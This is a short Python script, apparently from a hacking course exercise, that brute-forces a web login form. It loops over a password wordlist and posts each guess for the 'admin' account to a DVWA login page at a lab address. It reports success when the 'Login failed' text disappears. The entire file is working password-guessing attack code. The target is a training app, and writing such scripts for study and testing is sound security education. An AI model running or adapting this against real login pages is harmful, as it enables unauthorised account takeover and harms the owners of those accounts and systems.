#!/usr/bin/env python
# working

import requests
import sys

def bruteforce(username, url):
    for line in wordlist_file:
        word = line.strip()
        print("\r[!] Trying to bruteforce with password: " + word),
        sys.stdout.flush() 
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        if "Login failed" not in str(response.content):
            print(f"[+] Username: {username}")
            print(f"[+] Password: {word}")
            exit()

    print("[+] Reached end of line. Try another wordlist")

target_url = "http://10.0.2.10/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

try:
    with open("18. Writing a Program to Guess Login Information/passwords.txt", "r") as wordlist_file:
        bruteforce(data_dict["username"], target_url)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Exiting program...")


